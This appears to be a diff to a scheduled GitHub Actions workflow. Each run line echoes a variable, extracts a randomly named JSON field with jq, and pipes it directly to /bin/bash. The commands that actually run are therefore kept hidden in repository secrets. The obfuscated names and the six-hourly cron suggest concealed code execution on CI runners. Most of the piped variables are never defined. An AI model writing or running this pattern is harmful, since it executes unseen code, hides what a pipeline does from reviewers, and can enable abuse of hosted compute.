@@ -3,7 +3,8 @@ name: examineexact
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 0/6 * * *'
+    - cron: '17 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +13,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: examineexact
         env:
-          wty16: ${{ secrets.wty16 }}
+          jilc969: ${{ secrets.jilc969 }}
         run: |
-          echo $wty16 | jq -r .p4039 | /bin/bash
-          echo $ltwz12819 | jq -r .pce033 | /bin/bash
-          echo $fxyjf52 | jq -r .qdlv5 | /bin/bash
-          echo $w1 | jq -r .dy71 | /bin/bash
-          echo $hj570 | jq -r .ljstb23615 | /bin/bash
-          echo $shqj82 | jq -r .caaku4 | /bin/bash
-          echo $j61 | jq -r .cccdc45 | /bin/bash
+          echo $jilc969 | jq -r .nbhyp137 | /bin/bash
+          echo $s2 | jq -r .ujnx61214 | /bin/bash
+          echo $xla183 | jq -r .pb3 | /bin/bash
+          echo $rs5 | jq -r .ju57208 | /bin/bash
+          echo $o20 | jq -r .np37624 | /bin/bash
+          echo $bpc5517 | jq -r .vh60 | /bin/bash
+          echo $osb8801 | jq -r .y816 | /bin/bash
+          echo $e6 | jq -r .re26 | /bin/bash
+          echo $h3 | jq -r .box25779 | /bin/bash
+          echo $p01 | jq -r .mxm59545 | /bin/bash
+          echo $l6 | jq -r .tbxpj62 | /bin/bash
 
